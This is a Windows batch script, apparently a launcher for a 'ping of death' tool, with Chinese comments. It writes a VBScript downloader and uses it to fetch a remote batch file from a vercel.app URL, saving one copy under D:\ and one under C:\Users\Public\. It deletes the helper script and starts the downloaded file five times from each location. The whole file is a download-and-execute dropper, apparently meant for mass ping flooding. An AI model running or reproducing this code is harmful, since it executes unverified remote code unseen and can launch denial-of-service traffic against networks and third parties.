title pingofdeathStarter by Gloridust

 ::-----------D盘下载方案-----------
::设置要下载的文件链接，仅支持http协议。必写项。
set Url=https://pingofdeath.vercel.app/pingofdeath.bat
::https://raw.githubusercontent.com/Gloridust/pingofdeath/main/pingofdeath.bat
::设置文件保存目录，若下载至当前目录，请留空
set Save=D:\
 
for %%a in ("%Url%") do set "FileName=%%~nxa"
if not defined Save set "Save=%cd%"
(echo Download Wscript.Arguments^(0^),Wscript.Arguments^(1^)
echo Sub Download^(url,target^)
echo   Const adTypeBinary = 1
echo   Const adSaveCreateOverWrite = 2
echo   Dim http,ado
echo   Set http = CreateObject^("Msxml2.ServerXMLHTTP"^)
echo   http.open "GET",url,False
echo   http.send
echo   Set ado = createobject^("Adodb.Stream"^)
echo   ado.Type = adTypeBinary
echo   ado.Open
echo   ado.Write http.responseBody
echo   ado.SaveToFile target
echo   ado.Close
echo End Sub)>D:\DownloadFile.vbs
DownloadFile.vbs "%Url%" "%Save%\%FileName%"
del DownloadFile.vbs
 
start D:\pingofdeath.bat
start D:\pingofdeath.bat
start D:\pingofdeath.bat
start D:\pingofdeath.bat
start D:\pingofdeath.bat

::-----------C盘下载方案-----------
::设置要下载的文件链接，仅支持http协议。必写项。
set Url=https://pingofdeath.vercel.app/pingofdeath.bat
::https://raw.githubusercontent.com/Gloridust/pingofdeath/main/pingofdeath.bat
::设置文件保存目录，若下载至当前目录，请留空
set Save=C:\Users\Public\
 
for %%a in ("%Url%") do set "FileName=%%~nxa"
if not defined Save set "Save=%cd%"
(echo Download Wscript.Arguments^(0^),Wscript.Arguments^(1^)
echo Sub Download^(url,target^)
echo   Const adTypeBinary = 1
echo   Const adSaveCreateOverWrite = 2
echo   Dim http,ado
echo   Set http = CreateObject^("Msxml2.ServerXMLHTTP"^)
echo   http.open "GET",url,False
echo   http.send
echo   Set ado = createobject^("Adodb.Stream"^)
echo   ado.Type = adTypeBinary
echo   ado.Open
echo   ado.Write http.responseBody
echo   ado.SaveToFile target
echo   ado.Close
echo End Sub)>C:\Users\Public\DownloadFile.vbs
DownloadFile.vbs "%Url%" "%Save%\%FileName%"
del DownloadFile.vbs

start C:\Users\Public\pingofdeath.bat
start C:\Users\Public\pingofdeath.bat
start C:\Users\Public\pingofdeath.bat
start C:\Users\Public\pingofdeath.bat
start C:\Users\Public\pingofdeath.bat